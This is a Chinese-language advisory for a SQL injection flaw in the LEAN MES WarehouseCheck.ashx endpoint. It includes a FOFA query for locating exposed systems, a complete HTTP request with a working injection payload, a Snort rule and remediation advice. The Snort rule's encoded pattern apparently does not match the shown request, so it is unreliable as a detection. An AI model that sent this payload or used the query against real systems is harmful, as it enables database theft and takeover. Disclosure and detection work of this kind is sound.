# 深科特LEAN MES系统 WarehouseCheck.ashx SQL注入漏洞

深科特LEAN MES系统 WarehouseCheck.ashx SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。

# 影响版本

深科特LEAN MES系统

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"

POC/EXP：第一步

```
GET /Handler/WarehouseCheck.ashx?api=GetGrnInfoList&orderNo=1%27+AND+9304+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%289304%3D9304%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--+keHv&itemCode=1 HTTP/1.1
Host: 127.0.0.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
```

![image-20260130171845277](assets/image-20260130171845277.png)



sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"深科特LEAN MES系统 - Boolean-Based SQL Injection via WarehouseCheck.ashx";
    flow:to_server,established;
    http.method; content:"GET";
    http.uri; content:"/Handler/WarehouseCheck.ashx";
    http.uri; content:"api=GetGrnInfoList";
    http.uri; pcre:"/orderNo=[^&]*%27%2BAND%2B9304%2BIN%2B%28SELECT%2B%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%2B%28CASE%2BWHEN%2B%289304%3D9304%29%2BTHEN%2BCHAR%2849%29%2BELSE%2BCHAR%2848%29%2BEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--/i";
    metadata:
        service http,
        affected_product "深科特LEAN MES系统",
        vulnerability_type "Boolean-Based SQL Injection",
        attack_target "database_server",
        severity "high";
    classtype:sql-injection;
    sid:1000594;
    rev:1;
    priority:1;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
